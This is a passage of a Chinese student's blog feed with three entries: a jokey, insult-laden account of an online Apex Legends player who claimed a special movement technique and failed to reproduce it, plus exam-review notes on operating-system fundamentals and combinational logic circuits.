    <summary type="html">&lt;p&gt;你👱🏻‍技术性博客没写几个就想整个生活blog了，哪怕根本没人看。&lt;/p&gt;
&lt;p&gt;其实你👱🏻‍想写这个很久了，但是你👱🏻‍没时间去写，只能东拼西凑点时间写，所以你👱🏻‍写的跟个精神分裂患者一样。&lt;/p&gt;
&lt;p&gt;你👱🏻‍这学期就是被瓜分的一学期。&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="你爹生活" scheme="http://example.com/tags/%E4%BD%A0%E7%88%B9%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>贵物堂1</title>
    <link href="http://example.com/2021/11/15/%E8%B4%B5%E7%89%A9%E5%A0%821/"/>
    <id>http://example.com/2021/11/15/%E8%B4%B5%E7%89%A9%E5%A0%821/</id>
    <published>2021-11-15T03:36:27.000Z</published>
    <updated>2022-01-14T08:52:52.634Z</updated>
    
    <content type="html"><![CDATA[<p>早在大二上你👱🏻‍刚建好博客的时候,你👱🏻‍就想这博客,除了能写技术性博客展现你👱🏻‍的愚昧，还可以写写你👱🏻‍目前所见过的一些事和一些银。</p><p>你👱🏻‍可能算是网络冲浪玩的比较早以及比较多的那种，因此也能认识许多贵物，你👱🏻‍想通过这个来跟家人们分享一下你👱🏻‍目前遇到过的贵物以及他们为什么被你👱🏻‍称为贵物。</p><p>但是你👱🏻‍遇到的贵物太多了，所以只能挑一些具有众生相以及可供参考资料较多的贵物加以详写。</p><p>你👱🏻‍要写的第一个贵物是2021下半年年度大戏，虽然你👱🏻‍19年就认识这个贵物了。</p><h1 id="滑步大师-☁︎✌-Cloudnight"><a href="#滑步大师-☁︎✌-Cloudnight" class="headerlink" title="滑步大师 ☁︎✌ Cloudnight"></a>滑步大师 ☁︎✌ Cloudnight</h1><pre><code>对你放水的时候你不珍惜拿你当个鸡脖你却笑笑嘻嘻像你这种人就是傻逼硬刀硬枪硬头皮复杂的滑步你给我去学习！</code></pre><p>这个银是你👱🏻‍在19年8月左右认识的，当时你👱🏻‍刚进递归公会，一个银都不认识，这个银主动来跟你👱🏻‍建交，拉你👱🏻‍进他的连部群，他这个时候🧠功能这块还算正常，所以你👱🏻‍觉得也无所谓。</p><p>你👱🏻‍刚进递归群的时候，这个银算是管理层之一，后面两年地位越来越低，干的事情据说越来越4️⃣🐎(你👱🏻‍当时处于冬眠状态不知道究竟干什么了)，逐渐成了群里的🤡。</p><p>19年到21年这两年间这个银都不能被你👱🏻‍称之为贵物。你👱🏻‍这段时间还挺信任这个银，什么事情还给他参考一下。</p><p>8月还发生的了一件比较大的事情，这个银2月的时候因为一些事情被踢出了递归公会，8月的时候经过别人的介绍又短暂回来了一段时间(这就是为什么你👱🏻‍当时还同情这个银，现在觉得确实好踢)，但这个银此时是想回来整活的。有天晚上1点左右他私聊你👱🏻‍怎么拿回来的管理，从此开始了3个小时的劝说，概括一下就是让你👱🏻‍退出递归去他那边，谁谁谁都觉得路易是个贵物准备跑路了，但是由于你👱🏻‍觉得他们不靠谱，所以一直没退群，后面确实印证了你👱🏻‍没看错银。</p><p>后面事情就发生了，接近二分之一的银退群，但是你👱🏻‍和你👱🏻‍的人都没退，估计也导致☁︎✌后面在别的群阴阳你👱🏻‍是韩国经理，法国大兵。</p><p>为了坚定一条船的银，这个银就每天在群里吟唱小作文，大概就是路易是个一无是处的贵物，把什么黑料都拿出来了，然后又以一个过去银的眼光进行貌似唯物主义的判断，路易必将灭亡。导致一堆本来不想参与这件弱智事情的银都觉得☁︎✌沾点魔怔。</p><p>☁︎✌的确可以开个专业叫做路易学。</p><p>你👱🏻‍对这个银的态度是同情，也还把这个银当个friend，但是一切4️⃣🐎的根源是21年8月初的时候来自于你👱🏻‍决定带这个银打🥧🥧。跟很多银一样，这个银一开始很菜，一局20分钟可以打出0点伤害的那种级别。但当时你👱🏻‍看他还有双锤骷髅海，不用问就知道怎么来的了。</p><p><img src="https://s2.loli.net/2022/01/14/6NDsalU5SCXqynj.jpg"></p><p>这是☁︎✌大师最开始滴水平，左边是钻石哥，中间是☁︎✌，右边是你👱🏻‍</p><p><img src="https://s2.loli.net/2022/01/14/7dPUEkv6GbYHxMg.png"></p><p>后面到了10月，可能我们的布洛特亨德尔是经历了一些exercise，期间每天都在群里进行成长日记(类似以上)，张口闭口就是大师朋友，不认识这个银的都以为这个银起码是带师水平，也是从这个时候开始群里问他要第一视角视频，然而直到今天我们都未曾目睹过。但只要跟他一打就是两位数伤害。有一天晚上这个银要跟你👱🏻‍去靶场比划比划，你👱🏻‍那天卷了一天晚上回来陪这个银靶场1v1，然后你👱🏻‍的态度就开始转变。</p><p>你👱🏻‍觉得这种骑士对决，就应该两边进行一个对称标准，然后这个银拿空投枪的喷火，还选个兰伯特，你👱🏻‍就拿的个普通枪，被打倒了几次，这个银就开始在语音和扣扣群里面🐕叫：”吴豪滨真的🥬啊”，”我就20帧”，然后开始对你👱🏻‍进行点评，你👱🏻‍让他拿一样的枪，他就说他卡，然后跟你👱🏻‍展开了辩论，然而说过去说过来都是那几句话白白浪费你👱🏻‍的time。</p><p><img src="https://s2.loli.net/2022/01/14/fAlMK2CuXdjOzo8.png"></p><p>   ☁︎✌大师对你👱🏻‍井底之蛙的评价</p><p>这段时间过后群里凡是跟☁︎✌打过游戏的人都再不想跟这个贵物打，因为这个贵物输了就只会恶心队友，赢了就说队友躺，后面基本上得罪了全群的银。</p><p>嗷对，☁︎✌对此评价的羊群效应，我们都是盲目从众无脑黑他。</p><p>后面有一次☁︎✌又在某个群发表”铁幕演说”，但你👱🏻‍刚好在那个群有眼，于是又通过转播对☁︎✌进行传话，☁︎✌立刻在那个群展开了狼人杀game，一个一个私聊抓间谍，因此又把几个银搞退了群，后面☁︎✌又拉了个5个银小群进行审讯，又被你👱🏻‍插了眼，但☁︎✌不觉得是另外4个银的问题，反而觉得你👱🏻‍使用了科技手段进行抓包，于是决定删除你👱🏻‍好友，以及退出所有你👱🏻‍在的群。于是☁︎✌从此disappear了一段时间。</p><p>直到12月初，大概是你👱🏻‍考数电前一周，你👱🏻‍发现这个贵物来到了开黑啦的中国Apex社区频道，这个频道应该是国内Apex频道里面最大滴一个，而且这个贵物这个时候已经当时了大师质检员，大概是个什么概念呢，就你👱🏻‍当时认识的银里面最高段位也就钻石，而大师质检员是能吊打大部分带师的存在，然后你☁︎✌从刚玩游戏的0伤害到这个阶段就用了3个月，一个月前还在铂金4坐牢的银现在已经成为了大师，而很多人玩这个游戏一两年都才上个钻石。</p><p>有银会觉得是吴豪滨🍋了，但有趣的是，☁︎✌带师从来不跟人打匹配，只在靶场亏内，频道里面几个顶级水平的人跟☁︎✌大师只能打个55开，有个银为此还专门买了张大鼠标垫，你只要找他去打匹配他就会说他状态不好。</p><p>这一切的原因都是☁︎✌自创了一种滑步身法，从第三视角看☁︎✌拿着枪跑的比动力小子开了技能都快，这种将摩擦力系数变为0的身法让☁︎✌甚至有了走出亚洲滴资本。</p><p>☁︎✌带师大概是觉得严师出高徒吧，他说话的画风大概已经变成了这样</p><p><img src="https://s2.loli.net/2022/01/14/LKZVE6tnAsS1Ua7.png" alt="image.png"></p><p>你👱🏻‍把之前他的小丑往事拿到频道上爆出来，打响了莱克星顿的枪声，然后就去复习数电了，结果晚上从图书馆回来的时候收到一堆私信说要锤他，原来短短20天☁︎✌就得罪了一堆银，其中不乏大师钻石。频道里面也已经开始开团让他发录制了。</p><p>第二天这个事情估计是闹大了，频道的几个管理员决定对☁︎✌进行重新测试，找了几个职业选手开直播验，但是这次就好像是换了个银一样，☁︎✌大师的滑步变成了左右AD，职业哥打了几次就觉得最多钻石4水平。之后☁︎✌又给录制者演示了滑步，职业哥也在这个时候放起了迈克尔的太空行走配合小丑的表演。</p><p>☁︎✌没能成功复现自己滴滑步3.0，说自己那天状态不好，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;早在大二上你👱🏻‍刚建好博客的时候,你👱🏻‍就想这博客,除了能写技术性博客展现你👱🏻‍的愚昧，还可以写写你👱🏻‍目前所见过的一些事和一些银。&lt;/p&gt;
&lt;p&gt;你👱🏻‍可能算是网络冲浪玩的比较早以及比较多的那种，因此也能认识许多贵物，你👱🏻‍想通过这个来</summary>
      
    
    
    
    
    <category term="你爹生活" scheme="http://example.com/tags/%E4%BD%A0%E7%88%B9%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>操作系统-one</title>
    <link href="http://example.com/2021/11/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-one/"/>
    <id>http://example.com/2021/11/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-one/</id>
    <published>2021-11-08T16:35:20.000Z</published>
    <updated>2021-11-08T16:51:24.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了"><a href="#这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了" class="headerlink" title="这是你👱🏻‍的亡🐏补牢 因为你👱🏻‍马上就要被🐏了"></a>这是你👱🏻‍的亡🐏补牢 因为你👱🏻‍马上就要被🐏了</h1><p>你👱🏻‍今天知道数字逻辑不考中期了，所以必须转移焦点到操作系统，因为你👱🏻‍最开始听操作系统的时候觉得这是什么✔️8️⃣玩意，结果你👱🏻‍一做作业才发现💩🐴了，所以操作系统这块必须浪👱🏻‍回头。</p><p>(里面的很多图片都是你👱🏻‍搞的别处的，必须声明一下防止被🐏，你👱🏻‍只是个搬运工 但是你👱🏻‍还是发表点看法)</p><h1 id="操作系统引论"><a href="#操作系统引论" class="headerlink" title="操作系统引论"></a>操作系统引论</h1><h1 id="操作系统是什么✔️8️⃣"><a href="#操作系统是什么✔️8️⃣" class="headerlink" title="操作系统是什么✔️8️⃣"></a>操作系统是什么✔️8️⃣</h1><p>操作系统为用户完成所有“硬件相关，应用无关“的工作，以给用户方便、高效、安全的使用环境</p><p>你👱🏻‍觉得确实无话可说，你👱🏻‍对于这种类似于文科的知识沾点无奈，必须观棋不语了。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>操作系统是一个大型的程序系统，它负责计算机的全部软、硬件资源的分配、调度工作，控制并协调多个任务的活动，实现信息的存取和保护。它提供用户接口，使用户获得良好的工作环境。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><pre><code>（1）、方便性：配置OS后计算机系统更容易使用（2）、有效性：改善资源利用率；提高系统 吞吐量（3）、可扩充性：OSde结构（如层次化的结构：无结构发展-&gt;模快化结构-&gt;层次化结构-&gt;微内核结构）（4）、开放性：OS遵循世界标准范围。</code></pre><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><pre><code>（1）、OS作为用户与计算机硬件系统之间的接口（API／CUI／GUI）即：OS处于用户与计算机硬件系统之间，用户通过OS来使用计算机系统。（2）、OS是计算机系统资源的管理者（处理机、存储器、I/O设备、文件）处理机管理是用于分配和控制处理机存储器管理是负责内存的分配与回收I/O设备管理是负责I/O设备的分配（回收）与操纵文件管理是用于实现文件的存取、共享和保护（3）、OS实现了对计算机资源的抽象（OS是扩充机/虚拟机）</code></pre><h1 id="操作系统发展历程"><a href="#操作系统发展历程" class="headerlink" title="操作系统发展历程"></a>操作系统发展历程</h1><h2 id="未配置操作系统的计算机系统（40年代-手工操作阶段）"><a href="#未配置操作系统的计算机系统（40年代-手工操作阶段）" class="headerlink" title="未配置操作系统的计算机系统（40年代 手工操作阶段）"></a>未配置操作系统的计算机系统（40年代 手工操作阶段）</h2><p>   （1）、人工操作方式：用户独占全机，资源空闲浪费。</p><p>缺点：</p><pre><code>手工装卸、人工判断、手工修改与调试内存指令等造成CPU空闲；提前完成造成剩余预约时间内的CPU完全空闲；I/O设备的慢速与CPU的速度不匹配造成的CPU空闲等待时间</code></pre><p>   （2）、脱机输入输出（Off-Line I/O）方式。</p><p>优点：</p><pre><code>减少了CPU的空闲时间提高了I/O速度</code></pre><h2 id="单道批处理系统（50年代）"><a href="#单道批处理系统（50年代）" class="headerlink" title="单道批处理系统（50年代）"></a>单道批处理系统（50年代）</h2><p>（1）、解决问题：</p><pre><code> 单道批处理系统是在解决人机矛盾和CPU与I/O设备速度不匹配矛盾的过程中形成的。批处理系统旨在提高系统资源的利用率和系统的吞吐量。（但单道批处理系统仍不能充分利用资源，故现在已很少用）</code></pre><p>单道批处理分为：联机批处理、脱机批处理</p><pre><code> 联机批处理：CPU直接控制作业输入输出 脱机批处理：由外围机控制作业输入输出</code></pre><p>（2）、缺点：</p><p>系统资源利用率低（因为内存中只存在一道程序，I/O请求成功前CPU都处于空闲状态）</p><p>（3）、特征</p><pre><code>自动性。正常情况下，一批作业能自动依次运行，无需人工干预。顺序性。各道作业是顺序进入内存，FCFS单道性。内存中任何时候只能有一道作业。</code></pre><h2 id="多道批处理系统（60年代初）"><a href="#多道批处理系统（60年代初）" class="headerlink" title="多道批处理系统（60年代初）"></a>多道批处理系统（60年代初）</h2><p>目的：为了进一步提高资源利用率和系统吞吐量</p><p>   该系统中，用户提交的作业都先存在外存中，在作业A在执行I/O请求时，CPU空闲，此时调用作业B，防止CPU空闲。同理按一定的算法调用作业，防止CPU空闲</p><p>PS:推动多道批处理系统形成和发展的动力是提高资源利用率和系统吞吐量。</p><p>优点：</p><pre><code>资源利用率高（资源指CPU、存储器、设备、数据）系统吞吐量大（系统吞吐量指系统在单位时间完成的总工作量（作业数量））</code></pre><p>缺点：</p><pre><code>平均周转时间长（作业的周转时间是指从作业进入系统开始，直至其完成并退出系统为止所经历的时间。）无交互能力</code></pre><p>特点：</p><pre><code>多道：内存同时存在多个作业宏观上并行：同时有多道程序在内存运行，某一时间段上，各道程序不同程度地向前推进。微观上串行：任一时刻最多只有一道作业占用CPU，多道程序交替使用CPU </code></pre><p>还需解决的问题：</p><pre><code>处理机管理问题内存管理问题（内存分配和保护）I/O设备管理问题文件管理问题（文件的组织和管理）作业管理问题用户与系统的接口（OS还应提供用户与OS的接口，方便用户操作）</code></pre><h2 id="分时系统（60年代中）"><a href="#分时系统（60年代中）" class="headerlink" title="分时系统（60年代中）"></a>分时系统（60年代中）</h2><p>分时系统是指在一台主机上连接多个带有显示器和键盘的终端，同时允许多个用户通过自己的键盘，以交互的方式使用计算机，共享主机中的资源。</p><p>PS:推动分时系统形成和发展的主要动力是用户的需要：交互、共享主机、方便上机。</p><p>关键问题：</p><pre><code>及时接收（多路卡和缓冲区）：作业直接进入内存、不允许一个作业长期占用处理机即时处理（划分时间片）：多个用户分时使用主机，每一用户分得一个时间片，用完这个时间片后操作系统将处理机分给另一用户，如此循环，每一用户可以周期性地获得CPU使用权，这样每一用户都有一种独占CPU的感觉。</code></pre><p>特征：</p><pre><code>多路性：允许同一主机联接多台终端。独立性：每一用户独占一个终端；每个用户感觉不到其他用户的存在。及时性：用户请求能及时响应。交互性：可进行广泛的人机对话。</code></pre><h2 id="实时操作系统（60年代中）"><a href="#实时操作系统（60年代中）" class="headerlink" title="实时操作系统（60年代中）"></a>实时操作系统（60年代中）</h2><p>实时系统（Real－Time System）是指系统能及时响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务协调一致地运行。</p><p>特征：</p><p>多路性<br>        对实时处理系统，系统按分时原则为多个终端服务；</p><pre><code>    对实时控制系统，系统经常对多路现场信息进行采集；以及对多个对象或多个执行机构进行控制。</code></pre><p>独立性<br>        实时处理系统，每个终端用户向实时系统提出服务请求时，彼此独立；</p><pre><code>    实时控制系统，对信息的采集和对对象的控制彼此不干扰。</code></pre><p>及时性（开始截止时间/完成截止时间）</p><p>交互性（仅限于访问专用服务程序）</p><p>可靠性（多级容错措施保障系统和数据安全）</p><h2 id="微机操作系统"><a href="#微机操作系统" class="headerlink" title="微机操作系统"></a>微机操作系统</h2><pre><code>单用户单任务操作系统：CP/M（75年）、MS-DOS（81年）。单用户多任务操作系统：OS/2（87年）、MS WINDOWS（90年windows 3.0)。多用户多任务操作系统：UNIX（70年）</code></pre><p>你👱🏻‍觉得后面这几个好像没前面几个重要，如果有人提醒你👱🏻‍要考，你👱🏻‍再补充</p><h2 id="多处理机操作系统"><a href="#多处理机操作系统" class="headerlink" title="多处理机操作系统"></a>多处理机操作系统</h2><h2 id="网络操作系统"><a href="#网络操作系统" class="headerlink" title="网络操作系统"></a>网络操作系统</h2><h2 id="分布式操作系统"><a href="#分布式操作系统" class="headerlink" title="分布式操作系统"></a>分布式操作系统</h2><h2 id="嵌入式操作系统"><a href="#嵌入式操作系统" class="headerlink" title="嵌入式操作系统"></a>嵌入式操作系统</h2><h1 id="操作系统的基本特性"><a href="#操作系统的基本特性" class="headerlink" title="操作系统的基本特性"></a>操作系统的基本特性</h1><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>并发是指在内存中放多道作业， 在一个时间段上来看，每一道作业都能不同程度地向前推进。但在任何一个时间点上只能有一道占用CPU。</p><p>两个概念：</p><pre><code>串行：在内存中每次只能放一道作业，只有它完 全执行完后别的作业才能进入内存执行。并行： 存在于有多个CPU的环境中， 在内存中放多道作业，在任一时间点上都可能有多道作业在不同的CPU上同时执行。 </code></pre><h2 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h2><p>系统中的资源可供多个并发的进程共同使用。</p><p>根据资源属性的不同，有两种资源共享方式：</p><pre><code>互斥共享方式（临界/独占资源）同时访问方式</code></pre><p>你👱🏻‍：并发和共享是OS的两个最基本的特性，二者互为条件！</p><h2 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h2><p>通过某种技术将一个物理实体映射为若干个逻辑上对应物（如CPU；一个屏幕可看成多个屏幕-窗口）。或将多个物理实体映射为一个逻辑实体（如虚拟存储是内存和外存的虚拟）。</p><p>虚拟是操作系统管理系统资源的重要手段，可提高资源利用率。</p><pre><code>CPU——多道程序设计技术/每个用户（进程）的“虚拟处理机&quot;存储器——每个进程都占有的地址空间（指令＋数据＋堆栈）I/O设备——打印机、多窗口或虚拟终端</code></pre><h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>不确定性：什么时候开始，执行多久时间，终止时间</p><p>操作系统的主要功能</p><p>   <strong>处理机管理功能</strong>：进程控制、进程同步、进程通信、调度（作业调度、进程调度）</p><p>   <strong>存储器管理功能</strong>：内存分配、内存保护、存储扩充、地址映射</p><p>   <strong>设备管理功能</strong>：缓冲管理、设备分配、设备处理</p><p>   <strong>文件管理功能</strong>：文件存储空间的管理、目录管理、文件的读 /写管理和保护</p><p>   <strong>操作系统与用户之间的接口</strong>：命令接口、程序接口、图形接口</p><pre><code>现代OS的新功能：系统安全：为保障数据的保密性、完整性和可用性，常使用的技术：认证 技术、密码技术、访问控制技术、反病毒技术网络功能和服务：网络通信、资源管理、应用互操作支持多媒体</code></pre><p>操作系统的结构设计</p><p>传统的操作系统结构</p><pre><code>无结构OS模块化OS结构分层式OS结构</code></pre><p>现代OS结构——微内核结构</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了&quot;&gt;&lt;a href=&quot;#这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了&quot; class=&quot;headerlink&quot; title=&quot;这是你👱🏻‍的亡🐏补牢 因为你👱🏻‍马上就要被🐏</summary>
      
    
    
    
    
    <category term="亡🐏补牢" scheme="http://example.com/tags/%E4%BA%A1%F0%9F%90%8F%E8%A1%A5%E7%89%A2/"/>
    
  </entry>
  
  <entry>
    <title>数字逻辑-two</title>
    <link href="http://example.com/2021/11/09/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-two/"/>
    <id>http://example.com/2021/11/09/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-two/</id>
    <published>2021-11-08T16:35:03.000Z</published>
    <updated>2021-11-08T16:36:12.961Z</updated>
    
    <content type="html"><![CDATA[<h1 id="你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局"><a href="#你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局" class="headerlink" title="你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局"></a>你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局</h1><p>你👱🏻‍觉得边复习边写Blog可以起到监督你👱🏻‍的作用。你👱🏻‍今天多少沾点偷懒就被拷问了 于是你👱🏻‍关闭Apex Legends开始复习</p><p>你👱🏻‍听说下周就要考数字逻辑了，但是你👱🏻‍一点都不会，所以你👱🏻‍必须做点权衡了，先抢救下数字逻辑。</p><p>(里面的很多图片都是你👱🏻‍搞的别处的，必须声明一下防止被🐏，你👱🏻‍只是个搬运工 但是你👱🏻‍还是发表点看法)</p><h1 id="组合逻辑电路"><a href="#组合逻辑电路" class="headerlink" title="组合逻辑电路"></a>组合逻辑电路</h1><h2 id="组合逻辑电路分析"><a href="#组合逻辑电路分析" class="headerlink" title="组合逻辑电路分析"></a>组合逻辑电路分析</h2><p>一般步骤：<br>1.根据输入逐级写出输出内容</p><p>2.化简逻辑功能</p><p>3.列出真值表</p><p>4.讨论功能</p><p>你👱🏻‍：听你👱🏻‍的话就按这么来<br>例题：</p><p><img src="https://img-blog.csdnimg.cn/20190525193954456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM4OTE3Mw==,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20190525194016315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM4OTE3Mw==,size_16,color_FFFFFF,t_70"></p><h2 id="组合逻辑电路设计"><a href="#组合逻辑电路设计" class="headerlink" title="组合逻辑电路设计"></a>组合逻辑电路设计</h2><p>步骤：</p><p>1.确定输入、输出以及它们之间的关系</p><p>2.列出真值表</p><p>3.化简</p><p>4.画出逻辑电路图</p><p>你👱🏻‍：同⬆️</p><p>例题：</p><p><img src="https://img-blog.csdnimg.cn/20190525194111535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM4OTE3Mw==,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/2019052519412059.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM4OTE3Mw==,size_16,color_FFFFFF,t_70"></p><h2 id="组合逻辑电路中的竞争冒险"><a href="#组合逻辑电路中的竞争冒险" class="headerlink" title="组合逻辑电路中的竞争冒险"></a>组合逻辑电路中的竞争冒险</h2><p>目前你👱🏻‍看到了对于竞争的两个版本：</p><p>一个是🚪电路两个输入信号同时向相反的逻辑电平跳变（一个从0变为1，一个从1变为0）的现象就叫做竞争。</p><p>一个是在组合逻辑电路中，某个输入变量通过两条或两条以上的途径传到输出端，由于每条途径延迟时间不同，到达输出🚪的时间就有先有后，这种现象称为竞争</p><p>但其实这两个概念都对，因为第一个概念针对的是竞争冒险的适用（经常出现的）情况，第二个是竞争冒险产生的根本原因。</p><p>所以你👱🏻‍必须澄清下了</p><p>竞争冒险是啥呢，你👱🏻‍：由于竞争而在电路输出端可能产生错误（脉冲尖峰）的现象</p><p>需要你👱🏻‍和你注意的是，不管是哪种竞争的概念，竞争都不会必然引起竞争—冒险现象。</p><p>下面你👱🏻‍画个时序图来说明竞争冒险的成因</p><p><img src="https://img-blog.csdnimg.cn/20200816180306734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNDgzOTIw,size_25,color_FFFFFF,t_70#pic_center"></p><p>如上图，可以看到!a并不是与a完全对称，而是有一定延迟，这是因为在电路中，传输有一定的延迟，一个非门也有延迟。在a从0变为1之后一段时间，这时候!a还为高，并没有在a从0变为1的同时从1变为0。最终出现了尖峰脉冲。</p><p><strong>消除方法</strong></p><p>1、接入滤波电容<br>因为尖峰脉冲一般都很窄（多在几十ns以内），所以只需要在输出端接一个很小的滤波电容，就可以将尖峰脉冲的宽度削弱至电路的阈值电压以下。但输出波形随电容变化，所以适用于对波形前、后沿无严格要求的场合。</p><p>你👱🏻‍：什么掩耳盗铃</p><p>2、引入选通脉冲。<br>选通脉冲在输出稳定之后才拉高，所以可以消除稳定之前的尖峰脉冲。但是，使用这种方法，必须得到一个与输入信号同步的选通脉冲，对它的宽度和作用时间有严格的要求。</p><p>你👱🏻‍：什么精准礼仪</p><p>3、修改逻辑设计，增加冗余项。<br>但使用范围有限，考虑的情况比较多，在不同输入的时候，冗余项会不一样，所以如果考虑所有情况，会花费比较多的资源，如果设计的好，适用范围可以适当增加。</p><p>你👱🏻‍：什么暗度陈仓</p><p>你👱🏻‍觉得这个应该就做个了解吧，填空选择考考就扎不多得嘞。</p><h2 id="常用的中规模组合逻辑标准构件"><a href="#常用的中规模组合逻辑标准构件" class="headerlink" title="常用的中规模组合逻辑标准构件"></a>常用的中规模组合逻辑标准构件</h2><p><strong>选择器</strong></p><p>你👱🏻‍：觉得从这里开始多少沾点难度了</p><p>数据选择器：从多路数据输入中选择其中一路送到输出端</p><p><img src="https://pic4.zhimg.com/80/v2-0325e0eaf58a22c9e1d552e03f3fb44b_720w.jpg"></p><p>A1 A0为地址信号，A1A0就构成了选择</p><p>4选1数据选择器真值表</p><p><img src="https://pic1.zhimg.com/80/v2-e3dd09177d4aeb845cc84bbdc0973990_720w.jpg"></p><p>四选一多路选择器：集成芯片74153，使能端：低电平有效</p><p>八选一多路选择器：集成芯片74151，使能端：低电平有效</p><p>例题：</p><p><img src="https://img-blog.csdnimg.cn/20190525194419998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM4OTE3Mw==,size_16,color_FFFFFF,t_70"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局&quot;&gt;&lt;a href=&quot;#你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局&quot; class=&quot;headerlink&quot; title=&quot;你👱🏻‍觉得从第二章开始就好像是黄金局到铂金局&quot;&gt;&lt;/a&gt;你👱🏻‍觉得从第二</summary>
      
    
    
    
    
    <category term="亡🐏补牢" scheme="http://example.com/tags/%E4%BA%A1%F0%9F%90%8F%E8%A1%A5%E7%89%A2/"/>
    
  </entry>
  
</feed>
